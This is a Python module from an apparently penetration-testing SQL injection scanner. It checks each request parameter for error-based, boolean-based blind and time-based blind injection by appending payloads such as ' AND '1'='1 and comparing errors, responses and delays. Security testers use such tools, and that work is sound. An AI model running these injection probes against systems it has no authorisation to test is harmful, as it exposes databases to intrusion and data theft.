import time
import requests
from utils import (
    BASIC_PAYLOADS,
    SLEEP_PAYLOADS,
    detect_database,
    similarity_ratio,
    send_request,
    send_request_timed
)


def injections(data, payload):
    for param in data:
        mutated = data.copy()
        mutated[param] = str(data[param]) + payload
        yield param, mutated


def error_based_detection(url, data, method):
    print("    [*] Testing Error-based SQLi...")
    results = []

    for payload in BASIC_PAYLOADS:
        for param, mutated in injections(data, payload):
            try:
                response = send_request(url, mutated, method)
                db_type = detect_database(response.text)

                if db_type != "Unknown":
                    results.append({
                        'type': 'Error-based',
                        'payload': payload,
                        'param': param,
                        'database': db_type,
                        'confidence': 'HIGH'
                    })
                    print(f"        [!] ERROR-BASED SQLi DETECTED on `{param}`!")
                    print(f"        Payload:  {payload}")
                    print(f"        Database: {db_type}")
            except Exception:
                continue

    if not results:
        print("        [✓] No error-based vulnerabilities found")
    return results


def boolean_based_detection(url, data, method):
    print("\n    [*] Testing Boolean-based SQLi...")
    results = []

    try:
        baseline = send_request(url, data, method)
        baseline_text = baseline.text
    except Exception:
        print("        [✗] Failed to get baseline response")
        return []

    true_payload = "' AND '1'='1"
    false_payload = "' AND '1'='2"

    for param, true_mutated in injections(data, true_payload):
        try:
            true_response = send_request(url, true_mutated, method)
        except Exception:
            print(f"        [✗] Failed TRUE condition on `{param}`")
            continue

        false_mutated = data.copy()
        false_mutated[param] = str(data[param]) + false_payload

        try:
            false_response = send_request(url, false_mutated, method)
        except Exception:
            print(f"        [✗] Failed FALSE condition on `{param}`")
            continue

        true_sim = similarity_ratio(baseline_text, true_response.text)
        false_sim = similarity_ratio(baseline_text, false_response.text)

        print(f"        [{param}] TRUE: {true_sim:.2f}  FALSE: {false_sim:.2f}")

        if true_sim > 0.90 and false_sim < 0.80:
            print(f"        [!] BOOLEAN-BASED SQLi DETECTED on `{param}`!")
            results.append({
                'type': 'Boolean-based Blind',
                'payload': f"{true_payload} / {false_payload}",
                'param': param,
                'confidence': 'MEDIUM',
                'true_similarity': f"{true_sim:.2f}",
                'false_similarity': f"{false_sim:.2f}"
            })

    if not results:
        print("        [✓] No boolean-based vulnerabilities found")
    return results


def time_based_detection(url, data, method):
    print("\n    [*] Testing Time-based SQLi...")

    try:
        start = time.time()
        send_request(url, data, method)
        baseline_time = time.time() - start
    except Exception:
        baseline_time = 1.0

    print(f"        Baseline time: {baseline_time:.2f}s")

    for payload in SLEEP_PAYLOADS:
        for param, mutated in injections(data, payload):
            try:
                start = time.time()
                send_request_timed(url, mutated, method, timeout=15)
                elapsed = time.time() - start
                delay = elapsed - baseline_time

                print(f"        [{param}] {payload} → {elapsed:.2f}s (delay: {delay:.2f}s)")

                if delay > 4:
                    print(f"        [!] TIME-BASED SQLi DETECTED on `{param}`!")
                    return [{
                        'type': 'Time-based Blind',
                        'payload': payload,
                        'param': param,
                        'confidence': 'HIGH',
                        'delay': f"{delay:.2f}s"
                    }]

            except requests.Timeout:
                print(f"        [{param}] {payload} → TIMEOUT")
                print(f"        [!] TIME-BASED SQLi DETECTED on `{param}`!")
                return [{
                    'type': 'Time-based Blind',
                    'payload': payload,
                    'param': param,
                    'confidence': 'HIGH',
                    'delay': 'timeout'
                }]
            except Exception:
                continue

    print("        [✓] No time-based vulnerabilities found")
    return []


def run_all_detectors(url, data, method):
    results = []
    results.extend(error_based_detection(url, data, method))
    results.extend(boolean_based_detection(url, data, method))
    results.extend(time_based_detection(url, data, method))
    return results